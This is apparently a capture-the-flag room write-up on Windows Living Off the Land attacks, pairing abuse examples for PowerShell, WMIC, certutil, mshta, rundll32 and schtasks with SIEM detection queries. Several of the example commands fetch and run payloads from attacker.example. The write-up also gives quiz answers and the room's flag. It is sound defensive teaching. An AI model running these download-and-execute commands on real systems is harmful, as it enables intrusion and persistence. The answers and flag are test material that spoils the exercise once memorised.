# Living Off the Land Attacks - Detailed Writeup

## Table of Contents
1. [Task 1: Introduction](#task-1-introduction-to-lol-attacks)
2. [Task 2: Common LoL Tools](#task-2-common-lol-tools-and-techniques)
3. [Task 3: Real-World Examples](#task-3-real-world-examples)
4. [Task 4: Detecting LoL Activity](#task-4-detecting-lol-activity)
5. [Task 5: Practical Exercise](#task-5-practical-exercise)
6. [Task 6: Key Takeaways](#task-6-key-takeaways)

---

## Task 1: Introduction to LoL Attacks

Living Off the Land (LoL) attacks represent a sophisticated attack methodology where adversaries leverage pre-installed, legitimate Windows utilities instead of deploying custom malware. This approach is particularly effective because these tools are trusted by default controls, reducing detection noise and allowing malicious activity to blend seamlessly with routine administrative operations.

The fundamental advantage lies in operational simplicity: attackers avoid the risk of new binaries being flagged by antivirus solutions, exploit the fact that legitimate tools are already whitelisted in many environments, and can accomplish their objectives through legitimate-looking administrative commands.

### Prerequisites Covered
Before tackling this room, familiarity with the following topics is beneficial:
- Malware classification fundamentals
- Introduction to malware analysis techniques
- General LoL attack concepts

### Learning Objectives
- Understand what Living Off the Land attacks are
- Identify legitimate Windows tools that can be abused
- Recognise attacker techniques that blend into normal system operations
- Detect LoL behaviour using log analysis and SIEM alerts

---

## Task 2: Common LoL Tools and Techniques

### Why Attackers Choose LoL Methods

Built-in tools provide several capabilities that directly match common attacker goals:
- **Scripting engines** for code execution
- **Management utilities** for system control
- **File handling** capabilities for payload delivery
- **Scheduling mechanisms** for persistence

These legitimate functions, when misused, become attack vectors for execution, persistence, reconnaissance, and lateral movement.

### Key Tools and Their Abuse Patterns

#### PowerShell
- In-memory script execution without file drops
- Remote payload downloads and execution
- Policy bypass through `-Exec Bypass` flags
- Automation of multi-stage attacks
- Common parameters: `-NoP`, `-NonI`, `-W Hidden`

#### WMIC (Windows Management Instrumentation Command-line)
- Remote command execution on target systems
- Process creation and management
- System state queries and reconnaissance
- Blends with legitimate administrative tasks
- Common operations: `process call create`, `process get`

#### Certutil
- File downloads using `-urlcache` flag
- Base64 encoding/decoding of payloads
- Certificate operations as cover for malicious activity
- Common flags: `-urlcache -split -f`, `-decode`, `-encode`

#### Mshta
- Execution of HTML Application files
- Inline JavaScript execution
- Remote HTA file loading and execution
- ActiveX object instantiation

#### Rundll32
- DLL export invocation
- URL protocol handler triggering
- In-memory code execution
- Common pattern: `rundll32.exe [DLL],ExportFunction`

#### Scheduled Tasks (schtasks)
- Persistence across system reboots
- Code execution at user logon
- Regular schedule-based payload execution
- Common triggers: ONLOGON, DAILY, ONIDLE

### Defensive Measures

Layered approach combining multiple strategies:
- Apply endpoint, network, and identity protections
- Implement AppLocker and Windows Defender Application Control (WDAC)
- Enforce principle of least privilege
- Configure network rules and DNS filtering
- Maintain containment playbooks
- Regularly review access and logging coverage

### Task 2 - Q&A

| Question | Answer |
|----------|--------|
| Which public site lists Unix/Linux native binaries and how they can be abused? | GTFOBins |
| Which Microsoft toolset includes PsExec and Autoruns, used for admin tasks and often misused by attackers? | Sysinternals |

---

## Task 3: Real-World Examples

### APT29 (Nobelium) – PowerShell and WMI for Persistence

APT29 demonstrated sophisticated fileless techniques by combining PowerShell with WMI event subscriptions. Their approach involved:
- Creating WMI event subscriptions to trigger code execution
- Storing encrypted PowerShell payloads in WMI properties
- Reading, decrypting, and executing payloads directly from WMI
- Leaving minimal on-disk artifacts

**MITRE ATT&CK Reference:** T1546.003 - Event Triggered Execution

This technique exemplifies how legitimate monitoring mechanisms can be weaponized for persistence.

### BlackCat (ALPHV) Ransomware – Built-in Tools for Lateral Movement

BlackCat/ALPHV operators employed a multi-tool approach:
- PowerShell for scripting and defense disabling
- PsExec from Sysinternals for remote execution and lateral spread
- Certutil for payload fetching and decoding
- Built-in tools allowed them to operate with minimal detection

The group successfully moved laterally across networks while maintaining the appearance of legitimate administrative activity.

### Cobalt Strike Loaders: QakBot and IcedID

These malware families use LoL techniques to bootstrap Cobalt Strike beacons:
- Rundll32.exe executing DLL exports
- Mshta.exe running HTA/JavaScript payloads
- Signed Windows binaries making execution appear legitimate
- In-memory payload delivery avoiding disk artifacts

Multiple incident reports demonstrate how these loaders achieve high success rates through LoL techniques.

### Task 3 - Q&A

| Question | Answer |
|----------|--------|
| What MITRE technique ID covers WMI event subscriptions? | T1546.003 |
| Which abbreviated name refers to one of the services that C2s, like Cobalt Strike, use to start or listen for remote services? | SMB |

---

## Task 4: Detecting LoL Activity

### PowerShell Detection

#### Attack Command Examples
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"

powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...

powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

#### Detection Indicators
- IEX (Invoke-Expression) combined with DownloadString
- `-EncodedCommand` parameter hiding payload in base64
- `-Exec Bypass` circumventing execution policy
- Invoke-WebRequest for remote file download
- Invoke-RestMethod for API communication

#### SIEM Alert Pattern
```
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR 
CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR 
CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### WMIC Detection

#### Attack Command Examples
```powershell
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"

wmic /node:TARGETHOST process get name,commandline

wmic process call create "notepad.exe" /hidden
```

#### Detection Indicators
- Remote node targeting with `/node:` parameter
- Process call create for arbitrary command execution
- Process enumeration queries
- Hidden process spawning attempts

#### SIEM Alert Pattern
```
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR 
CommandLine="*wmic*process get Name,CommandLine*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### Certutil Detection

#### Attack Command Examples
```powershell
certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe

certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe

certutil -encode C:\Users\Public\decoded.exe C:\Users\Public\encoded.b64
```

#### Detection Indicators
- `-urlcache -split -f` flags for file download
- `-decode` operations on suspicious files
- `-encode` operations potentially obfuscating payloads
- Downloads to Public or Temp directories

#### SIEM Alert Pattern
```
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### Mshta Detection

#### Attack Command Examples
```powershell
mshta "http://attacker.example/payload.hta"

mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"

mshta "C:\Users\Public\malicious.hta"
```

#### Detection Indicators
- Remote HTA loading via HTTP/HTTPS
- Inline JavaScript execution
- ActiveX object instantiation for shell access
- Local HTA file execution

#### SIEM Alert Pattern
```
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" 
(CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine
```

---

### Rundll32 Detection

#### Attack Command Examples
```powershell
rundll32.exe C:\Users\Public\backdoor.dll,Start

rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"

rundll32.exe C:\Windows\Temp\loader.dll,Run
```

#### Detection Indicators
- DLL execution from suspicious locations (Public, Temp)
- URL protocol handler invocation
- Unusual export function calls
- Network-connected rundll32 processes

#### SIEM Alert Pattern
```
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" 
(CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR 
CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

---

### Scheduled Tasks Detection

#### Attack Command Examples
```powershell
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')"

schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05

schtasks /Run /TN "WindowsUpdate"
```

#### Detection Indicators
- Task creation with `/Create` parameter
- Benign-sounding task names (WindowsUpdate, Maintenance)
- Trigger types: ONLOGON for persistence
- PowerShell execution from scheduled tasks
- Task execution with `/Run` parameter

#### SIEM Alert Pattern
```
index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) 
(CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR 
Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```

### Task 4 - Q&A

| Question | Answer |
|----------|--------|
| Which PowerShell switch is used to download text/strings and execute them? | IEX |
| Which WMIC keyword triggers the creation of a new process on a remote host? | create |

---

## Task 5: Practical Exercise

### Lab Environment Setup

Access the web interface at the provided lab URL to interact with a controlled environment demonstrating LoL detection.

### Objective

Analyze provided alerts and classify them based on the techniques covered in previous tasks. Your analysis should identify:
- Which LoL tool was used
- The technique category (execution, persistence, lateral movement, reconnaissance)
- Relevant detection indicators
- Appropriate defensive response

### Flag Capture

After completing the alert analysis in the lab environment:

```
Flag: THM{LOL-but-not-that-lol-you-finishit}
```

---

## Task 6: Key Takeaways

### Techniques Mastered

Through this room, you now understand:
- How PowerShell enables fileless, in-memory execution through IEX and DownloadString
- WMIC's role in remote process creation and system reconnaissance
- Certutil's dual capability for downloading and decoding payloads
- Mshta and Rundll32 as execution vehicles for scripts and DLL content
- Scheduled Tasks as a persistence mechanism beyond reboots

### Detection Strategy

Effective LoL detection requires:
- **Enhanced logging:** Capture full command lines, not just process names
- **Behavioral analysis:** Recognize when legitimate tools are used abnormally (e.g., PowerShell from non-admin contexts, WMIC querying remote hosts)
- **SIEM tuning:** Create specific alerts for suspicious parameter combinations
- **Process tree analysis:** Examine parent-child relationships to identify injection chains

### Operational Response

When LoL activity is detected:
1. Isolate affected systems immediately using containment playbooks
2. Revoke exposed credentials across the organization
3. Analyze command history to reconstruct attacker actions
4. Check for persistence mechanisms (scheduled tasks, WMI subscriptions)
5. Apply remediation based on attack progression (lateral movement, data exfiltration)

### Continuous Improvement

Stay current with evolving LoL techniques by:
- Monitoring MITRE ATT&CK updates for T1546 and related technique IDs
- Reviewing LOLBAS and GTFOBins databases for new abuse patterns
- Analyzing threat intelligence on APT and ransomware group TTPs
- Updating SIEM detection rules to match new attack variations
- Participating in security communities and incident response exercises

---

## Quick Reference: Detection Commands

### PowerShell Red Flags
- `IEX` + `DownloadString`
- `-EncodedCommand`
- `-Exec Bypass`
- `Invoke-WebRequest`
- `Invoke-RestMethod`

### WMIC Red Flags
- `/node:` parameter (remote execution)
- `process call create`
- `process get Name,CommandLine`

### Certutil Red Flags
- `-urlcache -split -f`
- `-decode`
- `-encode`

### Mshta Red Flags
- HTTP/HTTPS URLs
- `javascript:` URIs
- `.hta` file extensions

### Rundll32 Red Flags
- Suspicious DLL locations (Public, Temp)
- `url.dll,FileProtocolHandler`
- Unusual export functions

### Scheduled Tasks Red Flags
- `/Create` parameter
- `/Run` parameter
- ONLOGON trigger
- PowerShell execution
- Benign-sounding task names

---

**Room Completed:** Living Off the Land Attacks
**Flag:** THM{LOL-but-not-that-lol-you-finishit}
**Date:** November 2025

---

*This writeup serves as your reference guide for understanding, detecting, and responding to Living Off the Land attacks in Windows environments.*
